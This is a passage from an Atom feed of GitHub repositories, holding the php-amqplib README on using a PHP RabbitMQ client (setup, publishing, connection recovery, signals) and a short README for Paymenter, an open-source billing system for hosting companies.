href=&#34;https://github.com/lukebakken&#34;&gt;Luke Bakken&lt;/a&gt; and several VMware engineers working on RabbitMQ.&lt;/p&gt; &#xA;&lt;h2&gt;Supported RabbitMQ Versions&lt;/h2&gt; &#xA;&lt;p&gt;Starting with version 2.0 this library uses &lt;code&gt;AMQP 0.9.1&lt;/code&gt; by default and thus requires &lt;a href=&#34;http://www.rabbitmq.com/download.html&#34;&gt;RabbitMQ 2.0 or later version&lt;/a&gt;. Usually server upgrades do not require any application code changes since the protocol changes very infrequently but please conduct your own testing before upgrading.&lt;/p&gt; &#xA;&lt;h2&gt;Supported RabbitMQ Extensions&lt;/h2&gt; &#xA;&lt;p&gt;Since the library uses &lt;code&gt;AMQP 0.9.1&lt;/code&gt; we added support for the following RabbitMQ extensions:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Exchange to Exchange Bindings&lt;/li&gt; &#xA; &lt;li&gt;Basic Nack&lt;/li&gt; &#xA; &lt;li&gt;Publisher Confirms&lt;/li&gt; &#xA; &lt;li&gt;Consumer Cancel Notify&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Extensions that modify existing methods like &lt;code&gt;alternate exchanges&lt;/code&gt; are also supported.&lt;/p&gt; &#xA;&lt;h3&gt;Related libraries&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/php-enqueue/amqp-lib&#34;&gt;enqueue/amqp-lib&lt;/a&gt; is a &lt;a href=&#34;https://github.com/queue-interop/queue-interop#amqp-interop&#34;&gt;amqp interop&lt;/a&gt; compatible wrapper.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/cloudamqp/amqproxy&#34;&gt;AMQProxy&lt;/a&gt; is a proxy library with connection and channel pooling/reusing. This allows for lower connection and channel churn when using php-amqplib, leading to less CPU usage of RabbitMQ.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Setup&lt;/h2&gt; &#xA;&lt;p&gt;Ensure you have &lt;a href=&#34;http://getcomposer.org&#34;&gt;composer&lt;/a&gt; installed, then run the following command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ composer require php-amqplib/php-amqplib&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;That will fetch the library and its dependencies inside your vendor folder. Then you can add the following to your .php files in order to use the library&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;require_once __DIR__.&#39;/vendor/autoload.php&#39;;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then you need to &lt;code&gt;use&lt;/code&gt; the relevant classes, for example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;use PhpAmqpLib\Connection\AMQPStreamConnection;&#xA;use PhpAmqpLib\Message\AMQPMessage;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;p&gt;With RabbitMQ running open two Terminals and on the first one execute the following commands to start the consumer:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ cd php-amqplib/demo&#xA;$ php amqp_consumer.php&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then on the other Terminal do:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ cd php-amqplib/demo&#xA;$ php amqp_publisher.php some text to publish&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You should see the message arriving to the process on the other Terminal&lt;/p&gt; &#xA;&lt;p&gt;Then to stop the consumer, send to it the &lt;code&gt;quit&lt;/code&gt; message:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ php amqp_publisher.php quit&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you need to listen to the sockets used to connect to RabbitMQ then see the example in the non blocking consumer.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ php amqp_consumer_non_blocking.php&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Change log&lt;/h2&gt; &#xA;&lt;p&gt;Please see &lt;a href=&#34;https://raw.githubusercontent.com/php-amqplib/php-amqplib/master/CHANGELOG.md&#34;&gt;CHANGELOG&lt;/a&gt; for more information what has changed recently.&lt;/p&gt; &#xA;&lt;h2&gt;API Documentation&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://php-amqplib.github.io/php-amqplib/&#34;&gt;http://php-amqplib.github.io/php-amqplib/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Tutorials&lt;/h2&gt; &#xA;&lt;p&gt;To not repeat ourselves, if you want to learn more about this library, please refer to the &lt;a href=&#34;http://www.rabbitmq.com/tutorials/tutorial-one-php.html&#34;&gt;official RabbitMQ tutorials&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;More Examples&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;amqp_ha_consumer.php&lt;/code&gt;: demos the use of mirrored queues.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;amqp_consumer_exclusive.php&lt;/code&gt; and &lt;code&gt;amqp_publisher_exclusive.php&lt;/code&gt;: demos fanout exchanges using exclusive queues.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;amqp_consumer_fanout_{1,2}.php&lt;/code&gt; and &lt;code&gt;amqp_publisher_fanout.php&lt;/code&gt;: demos fanout exchanges with named queues.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;amqp_consumer_pcntl_heartbeat.php&lt;/code&gt;: demos signal-based heartbeat sender usage.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;basic_get.php&lt;/code&gt;: demos obtaining messages from the queues by using the &lt;em&gt;basic get&lt;/em&gt; AMQP call.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Multiple hosts connections&lt;/h2&gt; &#xA;&lt;p&gt;If you have a cluster of multiple nodes to which your application can connect, you can start a connection with an array of hosts. To do that you should use the &lt;code&gt;create_connection&lt;/code&gt; static method.&lt;/p&gt; &#xA;&lt;p&gt;For example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$connection = AMQPStreamConnection::create_connection([&#xA;    [&#39;host&#39; =&amp;gt; HOST1, &#39;port&#39; =&amp;gt; PORT, &#39;user&#39; =&amp;gt; USER, &#39;password&#39; =&amp;gt; PASS, &#39;vhost&#39; =&amp;gt; VHOST],&#xA;    [&#39;host&#39; =&amp;gt; HOST2, &#39;port&#39; =&amp;gt; PORT, &#39;user&#39; =&amp;gt; USER, &#39;password&#39; =&amp;gt; PASS, &#39;vhost&#39; =&amp;gt; VHOST]&#xA;],&#xA;$options);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This code will try to connect to &lt;code&gt;HOST1&lt;/code&gt; first, and connect to &lt;code&gt;HOST2&lt;/code&gt; if the first connection fails. The method returns a connection object for the first successful connection. Should all connections fail it will throw the exception from the last connection attempt.&lt;/p&gt; &#xA;&lt;p&gt;See &lt;code&gt;demo/amqp_connect_multiple_hosts.php&lt;/code&gt; for more examples.&lt;/p&gt; &#xA;&lt;h2&gt;Batch Publishing&lt;/h2&gt; &#xA;&lt;p&gt;Let&#39;s say you have a process that generates a bunch of messages that are going to be published to the same &lt;code&gt;exchange&lt;/code&gt; using the same &lt;code&gt;routing_key&lt;/code&gt; and options like &lt;code&gt;mandatory&lt;/code&gt;. Then you could make use of the &lt;code&gt;batch_basic_publish&lt;/code&gt; library feature. You can batch messages like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$msg = new AMQPMessage($msg_body);&#xA;$ch-&amp;gt;batch_basic_publish($msg, $exchange);&#xA;&#xA;$msg2 = new AMQPMessage($msg_body);&#xA;$ch-&amp;gt;batch_basic_publish($msg2, $exchange);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;and then send the batch like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$ch-&amp;gt;publish_batch();&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;When do we publish the message batch?&lt;/h3&gt; &#xA;&lt;p&gt;Let&#39;s say our program needs to read from a file and then publish one message per line. Depending on the message size, you will have to decide when it&#39;s better to send the batch. You could send it every 50 messages, or every hundred. That&#39;s up to you.&lt;/p&gt; &#xA;&lt;h2&gt;Optimized Message Publishing&lt;/h2&gt; &#xA;&lt;p&gt;Another way to speed up your message publishing is by reusing the &lt;code&gt;AMQPMessage&lt;/code&gt; message instances. You can create your new message like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$properties = array(&#39;content_type&#39; =&amp;gt; &#39;text/plain&#39;, &#39;delivery_mode&#39; =&amp;gt; AMQPMessage::DELIVERY_MODE_PERSISTENT);&#xA;$msg = new AMQPMessage($body, $properties);&#xA;$ch-&amp;gt;basic_publish($msg, $exchange);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Now let&#39;s say that while you want to change the message body for future messages, you will keep the same properties, that is, your messages will still be &lt;code&gt;text/plain&lt;/code&gt; and the &lt;code&gt;delivery_mode&lt;/code&gt; will still be &lt;code&gt;AMQPMessage::DELIVERY_MODE_PERSISTENT&lt;/code&gt;. If you create a new &lt;code&gt;AMQPMessage&lt;/code&gt; instance for every published message, then those properties would have to be re-encoded in the AMQP binary format. You could avoid all that by just reusing the &lt;code&gt;AMQPMessage&lt;/code&gt; and then resetting the message body like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$msg-&amp;gt;setBody($body2);&#xA;$ch-&amp;gt;basic_publish($msg, $exchange);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Truncating Large Messages&lt;/h2&gt; &#xA;&lt;p&gt;AMQP imposes no limit on the size of messages; if a very large message is received by a consumer, PHP&#39;s memory limit may be reached within the library before the callback passed to &lt;code&gt;basic_consume&lt;/code&gt; is called.&lt;/p&gt; &#xA;&lt;p&gt;To avoid this, you can call the method &lt;code&gt;AMQPChannel::setBodySizeLimit(int $bytes)&lt;/code&gt; on your Channel instance. Body sizes exceeding this limit will be truncated, and delivered to your callback with a &lt;code&gt;AMQPMessage::$is_truncated&lt;/code&gt; flag set to &lt;code&gt;true&lt;/code&gt;. The property &lt;code&gt;AMQPMessage::$body_size&lt;/code&gt; will reflect the true body size of a received message, which will be higher than &lt;code&gt;strlen(AMQPMessage::getBody())&lt;/code&gt; if the message has been truncated.&lt;/p&gt; &#xA;&lt;p&gt;Note that all data above the limit is read from the AMQP Channel and immediately discarded, so there is no way to retrieve it within your callback. If you have another consumer which can handle messages with larger payloads, you can use &lt;code&gt;basic_reject&lt;/code&gt; or &lt;code&gt;basic_nack&lt;/code&gt; to tell the server (which still has a complete copy) to forward it to a Dead Letter Exchange.&lt;/p&gt; &#xA;&lt;p&gt;By default, no truncation will occur. To disable truncation on a Channel that has had it enabled, pass &lt;code&gt;0&lt;/code&gt; (or &lt;code&gt;null&lt;/code&gt;) to &lt;code&gt;AMQPChannel::setBodySizeLimit()&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Connection recovery&lt;/h2&gt; &#xA;&lt;p&gt;Some RabbitMQ clients using automated connection recovery mechanisms to reconnect and recover channels and consumers in case of network errors.&lt;/p&gt; &#xA;&lt;p&gt;Since this client is using a single-thread, you can set up connection recovery using exception handling mechanism.&lt;/p&gt; &#xA;&lt;p&gt;Exceptions which might be thrown in case of connection errors:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;PhpAmqpLib\Exception\AMQPConnectionClosedException&#xA;PhpAmqpLib\Exception\AMQPIOException&#xA;\RuntimeException&#xA;\ErrorException&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Some other exceptions might be thrown, but connection can still be there. It&#39;s always a good idea to clean up an old connection when handling an exception before reconnecting.&lt;/p&gt; &#xA;&lt;p&gt;For example, if you want to set up a recovering connection:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$connection = null;&#xA;$channel = null;&#xA;while(true){&#xA;    try {&#xA;        $connection = new AMQPStreamConnection(HOST, PORT, USER, PASS, VHOST);&#xA;        // Your application code goes here.&#xA;        do_something_with_connection($connection);&#xA;    } catch(AMQPRuntimeException $e) {&#xA;        echo $e-&amp;gt;getMessage();&#xA;        cleanup_connection($connection);&#xA;        usleep(WAIT_BEFORE_RECONNECT_uS);&#xA;    } catch(\RuntimeException $e) {&#xA;        cleanup_connection($connection);&#xA;        usleep(WAIT_BEFORE_RECONNECT_uS);&#xA;    } catch(\ErrorException $e) {&#xA;        cleanup_connection($connection);&#xA;        usleep(WAIT_BEFORE_RECONNECT_uS);&#xA;    }&#xA;}&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;A full example is in &lt;code&gt;demo/connection_recovery_consume.php&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;This code will reconnect and retry the application code every time the exception occurs. Some exceptions can still be thrown and should not be handled as a part of reconnection process, because they might be application errors.&lt;/p&gt; &#xA;&lt;p&gt;This approach makes sense mostly for consumer applications, producers will require some additional application code to avoid publishing the same message multiple times.&lt;/p&gt; &#xA;&lt;p&gt;This was a simplest example, in a real-life application you might want to control retr count and maybe gracefully degrade wait time to reconnection.&lt;/p&gt; &#xA;&lt;p&gt;You can find a more excessive example in &lt;a href=&#34;https://github.com/php-amqplib/php-amqplib/issues/444&#34;&gt;#444&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;UNIX Signals&lt;/h2&gt; &#xA;&lt;p&gt;If you have installed &lt;a href=&#34;http://www.php.net/manual/en/book.pcntl.php&#34;&gt;PCNTL extension&lt;/a&gt; dispatching of signal will be handled when consumer is not processing message.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$pcntlHandler = function ($signal) {&#xA;    switch ($signal) {&#xA;        case \SIGTERM:&#xA;        case \SIGUSR1:&#xA;        case \SIGINT:&#xA;            // some stuff before stop consumer e.g. delete lock etc&#xA;            pcntl_signal($signal, SIG_DFL); // restore handler&#xA;            posix_kill(posix_getpid(), $signal); // kill self with signal, see https://www.cons.org/cracauer/sigint.html&#xA;        case \SIGHUP:&#xA;            // some stuff to restart consumer&#xA;            break;&#xA;        default:&#xA;            // do nothing&#xA;    }&#xA;};&#xA;&#xA;pcntl_signal(\SIGTERM, $pcntlHandler);&#xA;pcntl_signal(\SIGINT,  $pcntlHandler);&#xA;pcntl_signal(\SIGUSR1, $pcntlHandler);&#xA;pcntl_signal(\SIGHUP,  $pcntlHandler);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To disable this feature just define constant &lt;code&gt;AMQP_WITHOUT_SIGNALS&lt;/code&gt; as &lt;code&gt;true&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php&#xA;define(&#39;AMQP_WITHOUT_SIGNALS&#39;, true);&#xA;&#xA;... more code&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Signal-based Heartbeat&lt;/h2&gt; &#xA;&lt;p&gt;If you have installed &lt;a href=&#34;http://www.php.net/manual/en/book.pcntl.php&#34;&gt;PCNTL extension&lt;/a&gt; and are using PHP 7.1 or greater, you can register a signal-based heartbeat sender.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php&#xA;&#xA;$sender = new PCNTLHeartbeatSender($connection);&#xA;$sender-&amp;gt;register();&#xA;... code&#xA;$sender-&amp;gt;unregister();&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Debugging&lt;/h2&gt; &#xA;&lt;p&gt;If you want to know what&#39;s going on at a protocol level then add the following constant to your code:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php&#xA;define(&#39;AMQP_DEBUG&#39;, true);&#xA;&#xA;... more code&#xA;&#xA;?&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Benchmarks&lt;/h2&gt; &#xA;&lt;p&gt;To run the publishing/consume benchmark type:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ make benchmark&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Tests&lt;/h2&gt; &#xA;&lt;p&gt;To successfully run the tests you need to first have a stock RabbitMQ broker running locally.Then, run tests like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ make test&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;Please see &lt;a href=&#34;https://raw.githubusercontent.com/php-amqplib/php-amqplib/master/CONTRIBUTING.md&#34;&gt;CONTRIBUTING&lt;/a&gt; for details.&lt;/p&gt; &#xA;&lt;h2&gt;Using AMQP 0.8&lt;/h2&gt; &#xA;&lt;p&gt;If you still want to use the old version of the protocol then you can do it by setting the following constant in your configuration code:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;define(&#39;AMQP_PROTOCOL&#39;, &#39;0.8&#39;);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The default value is &lt;code&gt;&#39;0.9.1&#39;&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Providing your own autoloader&lt;/h2&gt; &#xA;&lt;p&gt;If for some reason you don&#39;t want to use composer, then you need to have an autoloader in place fo the library classes. People have &lt;a href=&#34;https://github.com/videlalvaro/php-amqplib/issues/61#issuecomment-37855050&#34;&gt;reported&lt;/a&gt; to use this &lt;a href=&#34;https://gist.github.com/jwage/221634&#34;&gt;autoloader&lt;/a&gt; with success.&lt;/p&gt; &#xA;&lt;h2&gt;Original README:&lt;/h2&gt; &#xA;&lt;p&gt;Below is the original README file content. Credits goes to the original authors.&lt;/p&gt; &#xA;&lt;p&gt;PHP library implementing Advanced Message Queuing Protocol (AMQP).&lt;/p&gt; &#xA;&lt;p&gt;The library is port of python code of py-amqplib &lt;a href=&#34;http://barryp.org/software/py-amqplib/&#34;&gt;http://barryp.org/software/py-amqplib/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;It have been tested with RabbitMQ server.&lt;/p&gt; &#xA;&lt;p&gt;Project home page: &lt;a href=&#34;http://code.google.com/p/php-amqplib/&#34;&gt;http://code.google.com/p/php-amqplib/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;For discussion, please join the group:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://groups.google.com/group/php-amqplib-devel&#34;&gt;http://groups.google.com/group/php-amqplib-devel&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;For bug reports, please use bug tracking system at the project page.&lt;/p&gt; &#xA;&lt;p&gt;Patches are very welcome!&lt;/p&gt; &#xA;&lt;p&gt;Author: Vadim Zaliva &lt;a href=&#34;mailto:lord@crocodile.org&#34;&gt;lord@crocodile.org&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>Paymenter/Paymenter</title>
    <updated>2023-10-29T01:59:05Z</updated>
    <id>tag:github.com,2023-10-29:/Paymenter/Paymenter</id>
    <link href="https://github.com/Paymenter/Paymenter" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Free and open-source webshop alternative for hostings&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.discordapp.com/attachments/935234707015229511/1028031007573680318/unknown.png&#34; alt=&#34;Paymenter Logo&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://discord.gg/xB4UUT3XQg&#34;&gt;&lt;img src=&#34;https://img.shields.io/discord/882318291014651924.svg?logo=discord&#34; alt=&#34;Discord&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/Paymenter/paymenter/raw/master/LICENSE&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/license/paymenter/paymenter&#34; alt=&#34;GitHub&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/Paymenter/paymenter/releases&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/v/release/paymenter/paymenter&#34; alt=&#34;GitHub release (latest by date)&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/github/downloads/paymenter/paymenter/total&#34; alt=&#34;Downloads&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://discord.gg/xB4UUT3XQg&#34;&gt;Discord&lt;/a&gt;, &lt;a href=&#34;https://demo.paymenter.org&#34;&gt;Demo&lt;/a&gt;, &lt;a href=&#34;https://paymenter.org/docs/getting-started/introduction/&#34;&gt;Docs&lt;/a&gt;, &lt;a href=&#34;https://paymenter.org&#34;&gt;Website&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;A advanced payment system for your hosting company&lt;/h2&gt; &#xA;&lt;h3&gt;About&lt;/h3&gt; &#xA;&lt;p&gt;Introducing an advanced payment system for your hosting company, Paymenter! Paymenter is designed to be easy to use and install, with a user-friendly client and admin area. It&#39;s also highly customizable, with the ability to install a range of addons and themes from our marketplace created by talented developers and designers.&lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Free and open-source&lt;/li&gt; &#xA; &lt;li&gt;User-Friendly client and admin area&lt;/li&gt; &#xA; &lt;li&gt;Easily customizable&lt;/li&gt; &#xA; &lt;li&gt;Pay intergration with: Stripe, PayPal, Mollie and more&lt;/li&gt; &#xA; &lt;li&gt;Server intergration with: Pterodactyl, Virtualizor, Virtfusion and more&lt;/li&gt; &#xA; &lt;li&gt;Automatically bill your customers&lt;/li&gt; &#xA; &lt;li&gt;Built in support center&lt;/li&gt; &#xA; &lt;li&gt;Generate coupons to give your customers discounts&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Wanna take a look?&lt;/h2&gt; &#xA;&lt;p&gt;Visit our demo at: &lt;a href=&#34;https://demo.paymenter.org&#34;&gt;https://demo.paymenter.org&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Requirements&lt;/h2&gt; &#xA;&lt;p&gt;The requirements for Paymenter are the following:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;PHP (8.1 or higher)&lt;/li&gt; &#xA; &lt;li&gt;Composer&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Installation &amp;amp; Documentation&lt;/h2&gt; &#xA;&lt;p&gt;For a detailed explanation of how to install and configure Paymenter, take a look at our &lt;a href=&#34;https://paymenter.org/docs/getting-started/introduction/&#34;&gt;documentation here&lt;/a&gt;!&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Or, get additional help via &lt;a href=&#34;https://discord.gg/xB4UUT3XQg&#34;&gt;Community Discord&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>